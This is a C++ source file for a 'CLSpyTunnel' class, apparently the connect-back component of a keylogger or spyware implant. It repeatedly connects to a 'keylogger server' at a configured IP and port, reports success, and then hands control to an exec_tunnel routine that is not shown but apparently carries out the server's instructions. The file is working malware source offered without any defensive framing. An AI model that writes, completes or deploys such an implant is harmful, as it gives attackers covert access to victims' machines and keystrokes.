#include "clspytunnel.hpp"

int CLSpyTunnel::init(char* __ip, const uint __port, bool* __p_shutdown_flag) {
    ip_ = __ip;
    port_ = __port;
    p_shutdown_flag_ = __p_shutdown_flag;
    socket_ = -1;

    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("Invalid address or address not supported\n");
        return -1;
    }

    return 0;
}

void CLSpyTunnel::run() {
    int rc;
    int error = 0;
    socklen_t len = sizeof(error);
    
    while (!*p_shutdown_flag_) {        
        socket_ = socket(AF_INET, get_conn_type(), 0);
        if (socket_ < 0) {
            printf("Socket creation failed: %s\n", strerror(errno));
            return;
        }
        rc = connect(socket_, (struct sockaddr*) &server_addr_, sizeof(server_addr_));
        if (rc < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("Trying to connect to the server\n");
                goto retry;
            } else {
                printf("Connection failed: %s\n", strerror(errno));
                return;
            }
        }

        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("Connected to keylogger server %s:%d\n", ip_, port_);

        while (!tunnel_shutdown_flag_ && !*p_shutdown_flag_) {
            // Connection successful
            rc = send_out(socket_, EXEC_SUCCESS);
            if (rc < 0) {
                printf("Error sending data: %s\n", strerror(errno));
                break;
            }

            exec_tunnel();
        }

        retry:
            if (!*p_shutdown_flag_) {
                close(socket_);
                socket_ = -1;
                sleep(1);
            }
    }
}

void CLSpyTunnel::shutdown() {
    tunnel_shutdown_flag_ = true;
    if (socket_ >= 0) {
        close(socket_);
        socket_ = -1;
    }
}